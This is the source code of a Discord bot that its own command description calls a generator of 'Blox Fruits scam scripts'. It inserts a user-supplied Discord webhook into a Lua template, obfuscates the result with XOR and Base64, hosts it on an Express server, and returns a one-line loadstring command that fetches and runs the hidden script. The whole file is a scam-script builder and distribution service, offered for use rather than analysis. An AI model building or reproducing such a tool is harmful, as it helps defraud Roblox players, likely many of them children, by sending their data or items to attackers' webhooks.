const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ----- Persistent script store -----
const STORE_FILE = path.join(__dirname, 'scripts.json');
const SCRIPT_TTL = 24 * 60 * 60 * 1000; // 24 hours

// Load existing scripts from disk
let scripts = new Map();
if (fs.existsSync(STORE_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
        const now = Date.now();
        for (const [id, entry] of Object.entries(data)) {
            if (now < entry.expires) {
                scripts.set(id, entry);
            }
        }
        console.log(`✅ Loaded ${scripts.size} active scripts from disk.`);
    } catch (e) {
        console.warn('⚠️ Failed to load scripts.json, starting fresh.');
    }
}

// Save function
function saveScripts() {
    const obj = Object.fromEntries(scripts);
    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
}

// Clean expired and save periodically
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [id, entry] of scripts) {
        if (now > entry.expires) {
            scripts.delete(id);
            changed = true;
        }
    }
    if (changed) saveScripts();
}, 10 * 60 * 1000);

// ----- Web server -----
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/script/:id', (req, res) => {
    const id = req.params.id;
    const entry = scripts.get(id);
    if (!entry || Date.now() > entry.expires) {
        scripts.delete(id);
        saveScripts();
        return res.status(404).send('Script not found or expired.');
    }
    res.set('Content-Type', 'text/plain');
    res.send(entry.content);
});

app.get('/', (req, res) => res.send('Bot is alive!'));

app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Self‑ping (keep Render awake) -----
const RENDER_URL = process.env.RENDER_URL;
if (RENDER_URL) {
    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
    setInterval(() => {
        axios.get(RENDER_URL).catch(() => {});
    }, 4 * 60 * 1000);
    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
} else {
    console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // ----- Read template -----
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ 
                content: '❌ Template file not found. Please ensure `template.lua` is in the bot directory.' 
            });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // ----- Obfuscate locally -----
        const obfuscated = obfuscateScript(template);

        // ----- Store script with unique ID -----
        const id = uuidv4();
        scripts.set(id, {
            content: obfuscated,
            expires: Date.now() + SCRIPT_TTL
        });
        saveScripts();

        // ----- Build loadstring -----
        const baseUrl = RENDER_URL || `http://localhost:${PORT}`;
        const loadstringLine = `loadstring(game:HttpGet("${baseUrl}/script/${id}"))()`;

        // ----- Reply -----
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated (Obfuscated)')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { 
                    name: '📜 Loadstring (copy this)', 
                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
                    inline: false 
                },
                { 
                    name: '⏳ Script Expires', 
                    value: `In 24 hours (or until bot restarts)`,
                    inline: false 
                },
                { 
                    name: '🔒 Obfuscation', 
                    value: 'XOR + Base64 (lightweight)',
                    inline: false 
                }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

        // ----- Self‑ping -----
        if (RENDER_URL) {
            axios.get(RENDER_URL).catch(() => {});
        }

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Local obfuscator -----
function obfuscateScript(raw) {
    const key = Math.floor(Math.random() * 254) + 1;
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
